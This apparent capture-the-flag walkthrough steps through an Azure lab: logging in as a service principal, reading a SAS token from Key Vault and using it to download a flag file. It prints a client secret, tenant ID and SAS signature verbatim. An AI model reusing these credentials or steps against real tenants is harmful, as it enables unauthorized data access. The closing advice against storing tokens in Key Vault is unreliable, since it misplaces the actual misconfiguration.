
## STEP 1: Login to Azure
```cmd
az login --service-principal -u 76e1a895-1f05-4165-83ab-98eed07bed86 -p 6LU8Q~OjXfR3z8ZTOHqd0MpE8r1bGs0qStavaacZ --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
**WHY:** This logs you into Azure using the Service Principal credentials they gave you.

---

## STEP 2: Check what permissions you have
```cmd
az role assignment list --assignee 76e1a895-1f05-4165-83ab-98eed07bed86 --output json --all
```
**WHY:** This shows what Azure resources you can access and what actions you can perform.

---

## STEP 3: Find the Key Vault
```cmd
az keyvault list --resource-group DataBack-RG
```
**WHY:** This lists all Key Vaults in the Resource Group. You found "secopprobackkv".

---

## STEP 4: List secrets in the Key Vault
```cmd
az keyvault secret list --vault-name secopprobackkv
```
**WHY:** This shows all secret names stored in the Key Vault. You found "secopprobacksaSAASToken".

---

## STEP 5: Get the actual secret value
```cmd
az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
```
**WHY:** This reveals the actual SAS token value needed to access the Storage Account.

---

## STEP 6: Use SAS token to see Storage Account containers
```cmd
az storage container list --account-name secopprobacksa --sas-token "?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
```
**WHY:** The SAS token acts like a password to access the Storage Account. You found a container named "secopprobacksc".

---

## STEP 7: Download the flag file
```cmd
az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D"
```
**WHY:** This downloads the Flag.txt file from the storage container to your computer.

---

## STEP 8: View the flag
```cmd
type Flag.txt
```
**WHY:** This shows the contents of the file. You got: **CWL{Azure_KeyVau!t_H@cker}**

---

# SIMPLE EXPLANATION - WHY THIS WORKED:

1. **The Service Principal** had permission to READ secrets from Key Vault

2. **Someone made a mistake** by storing a Storage Account SAS token in Key Vault as a secret

3. **A SAS token is like a master key** - it lets anyone access the Storage Account without needing separate permissions

4. **You found the master key** in Key Vault, then used it to unlock the Storage Account and get the flag

**THE LESSON:** Never store access tokens in Key Vault if you don't want people to find them!
